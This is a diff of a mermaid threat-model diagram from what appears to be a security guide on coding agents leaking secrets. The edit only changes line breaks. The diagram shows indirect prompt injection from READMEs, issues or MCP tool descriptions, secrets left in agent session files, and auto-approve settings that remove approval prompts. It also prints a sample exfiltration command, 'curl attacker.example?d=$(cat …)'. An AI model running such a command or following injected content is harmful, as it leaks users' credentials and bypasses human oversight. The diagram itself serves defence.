@@ -111,14 +111,14 @@ subsequent command runs unprompted), and Codex's `approval_policy = "never"`.
 
 ```mermaid
 flowchart TD
-  paste["You paste a .env / token\nto debug a 401"] --> ctx
-  agentread["Agent reads .env,\n~/.aws/credentials while working"] --> ctx
-  ctx["Durable context on disk\n~/.claude/projects/**/*.jsonl\n~/.codex/sessions/**/rollout-*.jsonl\nCLAUDE.md / AGENTS.md\n.aider.chat.history.md"]
-  untrusted["Untrusted content\n(README, GitHub issue,\nMCP tool description)"] -->|"indirect prompt injection\n(OWASP LLM01)"| agent["Coding agent"]
+  paste["You paste a .env / token<br/>to debug a 401"] --> ctx
+  agentread["Agent reads .env,<br/>~/.aws/credentials while working"] --> ctx
+  ctx["Durable context on disk<br/>~/.claude/projects/**/*.jsonl<br/>~/.codex/sessions/**/rollout-*.jsonl<br/>CLAUDE.md / AGENTS.md<br/>.aider.chat.history.md"]
+  untrusted["Untrusted content<br/>(README, GitHub issue,<br/>MCP tool description)"] -->|"indirect prompt injection<br/>(OWASP LLM01)"| agent["Coding agent"]
   ctx -->|"agent re-reads its own memory"| agent
   agent -->|"allowlisted / auto-approved shell"| exfil["curl attacker.example?d=$(cat …)"]
-  exfil -.->|"secret leaves the host\n(OWASP LLM02)"| attacker["Attacker"]
-  config["Weak config:\nBash(*), autoApprove,\napproval_policy=never"] -.->|"removes the prompt\nthat would have stopped it"| agent
+  exfil -.->|"secret leaves the host<br/>(OWASP LLM02)"| attacker["Attacker"]
+  config["Weak config:<br/>Bash(*), autoApprove,<br/>approval_policy=never"] -.->|"removes the prompt<br/>that would have stopped it"| agent
 ```
 
 Two further exfiltration channels don't even need your shell. A malicious
